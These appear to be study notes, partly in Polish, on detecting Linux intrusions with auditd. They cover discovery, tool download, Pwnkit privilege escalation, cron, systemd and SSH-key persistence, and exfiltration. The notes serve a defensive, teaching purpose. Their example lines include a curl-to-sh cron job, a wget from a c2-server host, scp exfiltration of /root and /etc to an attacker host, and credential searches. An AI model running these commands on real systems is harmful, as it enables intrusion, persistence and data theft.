
### Process Tree

Drzewo procesów można wyświetlić za pomocą auditd `ausearch`, wystarczy mając złośliwy proces/polecenie prześledzić parentID, grantparentID i tak dalej aż PID nie będzie 1. Przykład:

```shell-session
ubuntu@thm-vm:~$ ausearch -i -x whoami # -x filters the results by the command name
type=PROCTITLE msg=audit(08/25/25 16:28:18.107:985) : proctitle=whoami
type=SYSCALL msg=audit(08/25/25 16:28:18.107:985) : syscall=execve success=yes exit=0 items=2 ppid=3905 pid=3907 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/whoami key=exec

ubuntu@thm-vm:~$ ausearch -i --pid 3905 # 3905 is a parent process ID of whoami
type=PROCTITLE msg=audit(08/25/25 16:28:17.101:983) : proctitle=/bin/sh -c whoami
type=SYSCALL msg=audit(08/25/25 16:28:17.101:983) : syscall=execve success=yes exit=0 items=2 ppid=3898 pid=3905 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/dash key=exec

ubuntu@thm-vm:~$ ausearch -i --pid 3898 # 3898 is a grandparent process ID of whoami
type=PROCTITLE msg=audit(08/25/25 16:28:11.727:982) : proctitle=/usr/bin/python3 /opt/mywebapp/app.py
type=SYSCALL msg=audit(08/25/25 16:28:11.727:982) : syscall=execve success=yes exit=0 items=2 ppid=1 pid=3898 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/python3.12 key=exec
```


### Discovery

Najczęstsze polecenia podczas fazy discovery ataku na system:

|Discovery Goal|Typical Commands|
|---|---|
|OS and Filesystem Discovery|`pwd`, `ls /`, `env`, `uname -a`, `lsb_release -a`, `hostname`|
|User and Groups Discovery|`id`, `whoami`, `w`, `last`, `cat /etc/sudoers`, `cat /etc/passwd`|
|Process and Network Discovery|`ps aux`, `top`, `ip a`, `ip r`, `arp -a`, `ss -tnlp`, `netstat -tnlp`|
|Cloud or Sandbox Discovery|`systemd-detect-virt`, `lsmod`, `uptime`, `pgrep "<edr-or-sandbox>"`|
Kolejnym krokiem w ataku jest z reguły bardziej szczegółowe odkrywanie:

|Attack Objectives|Typical Commands|
|---|---|
|Find and steal credentials and other sensitive data|`history \| grep pass`, `find / -name .env`, `find /home -name id_rsa`|
|Identify how suitable the system is for crypto mining|`cat /proc/cpuinfo`, `lscpu \| grep Model`, `free -m`, `top`, `htop`|
|Scan the internal network for other future victims|`ping <ip>`, `for ip in 192.168.1.{1..254}; do nc -w 1 $ip 22 done`|

![](Attatchments/Pasted%20image%2020251126134451.png)

### Transfer plików na zaatakowany system

Po fazie odkrycia często hackerzy wgrywają kolejne narzędzia np. do kopania krypto, dodania urządzenia do botnetu czy żeby wykorzystać jako proxy.

|Command|Usage Example|
|---|---|
|**Wget**: Download a file from the website|`wget https://github.com/xmrig/[...]/xmrig-x64.tar.gz -O /tmp/miner.tar.gz`|
|**Curl**: Make a request to the webpage|`curl --output /var/www/html/backdoor.php "https://pastebin.thm/yTg0Ah6a"`|
|**SSH**: Transfer a file via [SCP or SFTP](https://www.redhat.com/en/blog/secure-file-transfer-scp-sftp)|`scp kali@c2server:/home/kali/cve-2021-4034.sh /tmp/cve-2021-4034.sh`|
Jak atakujący połączy się po SCP albo SFTP to nie będzie widać logów w auditd, jedynie logowanie ssh.

Detekcja może być też przez sprawdzenie ruchu sieciowego - github, dziwne domeny, virustotal, tworzenie plików w /tmp albo /var/tmp, stworzone pliki o nazwach jak exploit, shell.php czy jakieś losowe znaki.

### Privilege escalation

```bash
# Detection 1: A Spike of Discovery Commands
whoami                                                # Returns "www-data" user
id; pwd; ls -la; crontab -l                           # Basic initial Discovery
ps aux | egrep "edr|splunk|elastic"                   # Security tools Discovery
uname -r                                              # Returns an old 4.4 kernel

# Detection 2: A Download to Temp Directory
wget http://c2-server.thm/pwnkit.c -O /tmp/pwnkit.c   # Pwnkit exploit download
gcc /tmp/pwnkit.c -o /tmp/pwnkit                      # Pwnkit exploit compilation
chmod +x /tmp/pwnkit                                  # Making exploit executable
/tmp/pwnkit                                           # Trying to use the exploit

# Detection 3: Data Exfiltration With SCP
whoami                                                # Now returns "root" user
tar czf dump.tar.gz /root /etc/                       # Archiving sensitive data
scp dump.tar.gz attacker@c2-server.thm:~              # Exfiltrating the data
```

### Cron persistence

To `nohup` to robi że nawet jak odpalam polecenie przez ssh i wyjdę to ono dalej będzie działać.

```bash
# A line added by APT29 to /var/spool/cron/<user> to run malware on boot
@reboot nohup /home/<user>/.<hidden-directory>/<malware-name> > /dev/null 2>&1 &
```

```bash
# A simplified command that adds the cron job to /etc/cron.d/root
echo "*/10 * * * root (curl https://pastebin.com/raw/1NtRkBc3) | sh" > /etc/cron.d/root
```

### Systemd Persistence

Systemd services host the most critical system components. Nowadays, DNS, SSH, and nearly every web service are organized as separate .service files located at `/lib/systemd/system` or `/etc/systemd/system` folders. With "root" privileges, you can make your own services, as can the threat actors.

```bash
# A simplified content of /lib/systemd/system/cloud-online.service file
[Unit]
Description=Initial cloud-online job    # Fake description to mimic a trusted service
[Service]
ExecStart=/usr/bin/cloud-online         # GOGETTER malware disguisted as a trusted file
```

Wykrywanie tego:

|                                    |                                                                                                                                                          |
| ---------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Monitor changes in cron job files  | `/etc/crontab`, `/etc/cron.d*`, `/var/spool/cron/*`, `/var/spool/crontab/*`                                                                              |
| Monitor changes in systemd folders | `/lib/systemd/system/*`, `/etc/systemd/system/*`, and [less common](https://manpages.ubuntu.com/manpages/questing/en/man5/systemd.unit.5.html) locations |
| Monitor related processes such as  | `nano /etc/crontab`, `crontab -e`, `systemctl start\|enable <service>`                                                                                   |

``` bash
`root@thm-vm:~$ ausearch -i -f /etc/systemd # Look for file changes inside /etc/systemd 
type=PROCTITLE msg=audit(09/22/25 16:55:12.740:806) : proctitle=vi /etc/systemd/system/malicious.service 
type=PATH msg=audit(09/22/25 16:55:12.740:806) : item=1 name=/etc/systemd/system/malicious.service 
type=CWD msg=audit(09/22/25 16:55:12.740:806) : cwd=/ 
type=SYSCALL msg=audit(09/22/25 16:55:12.740:806) : syscall=openat [...] a2=O_WRONLY|O_CREAT|O_EXCL ppid=1265 pid=1310 uid=root exe=/usr/bin/vi key=systemd  

root@thm-vm:~$ ausearch -i -x crontab # Look for execution of crontab command type=PROCTITLE msg=audit(09/22/25 17:25:14.933:807) : proctitle=crontab -e type=SYSCALL msg=audit(09/22/25 17:25:14.933:807) : syscall=execve [...] ppid=1265 pid=1316 uid=root key=exec`
```

### Persistance

Adding new user

```
root@thm-vm:~$ cat /var/log/auth.log | grep -E 'useradd|usermod' 
2025-09-18T15:46:30 thm-vm useradd[27254]: new group: name=support, GID=1001 2025-09-18T15:46:30 thm-vm useradd[27254]: new user: name=support, UID=1001, GID=1001, home=/home/support, shell=/bin/bash 
2025-09-18T15:46:32 thm-vm usermod[27258]: add 'support' to group 'sudo' 
2025-09-18T15:46:32 thm-vm usermod[27258]: add 'support' to shadow group 'sudo'
```

Adding backdor

```
# Adding SSH backdoor to the authorized_keys 
root@thm-vm:~$ echo "AAAAC3Nza...IkiINvQt/R" >> ~/.ssh/authorized_keys  

# It's hard to guess which key is a backdoor! 
root@thm-vm:~$ cat ~/.ssh/authorized_keys 
ssh-ed25519 AAAAC3Nza...oh5fpNy1Gi # Legitimate key 
ssh-ed25519 AAAAC3Nza...N9a2UYsFpQ # Legitimate key 
ssh-ed25519 AAAAC3Nza...IkiINvQt/R # Backdoor key
```

Detecting backdor ssh

```bash
# Traces of a backdoor created with "echo [key] >> ~/.ssh/authorized_keys"# Note how the malicious "echo" command is logged simply as "bash"
root@thm-vm:~$ ausearch -i -f /.ssh/authorized_keys
type=PROCTITLE msg=audit(09/22/25 16:55:12.740:806) : proctitle=bash
type=PATH msg=audit(09/22/25 16:55:12.740:806) : item=1 name=/home/user/.ssh/authorized_keys
type=CWD msg=audit(09/22/25 16:55:12.740:806) : cwd=/
type=SYSCALL msg=audit(09/22/25 16:55:12.740:806) : syscall=openat [...] a2=O_WRONLY|O_CREAT|O_EXCL ppid=1265 pid=1310 uid=root exe=/usr/bin/vi key=systemd
```
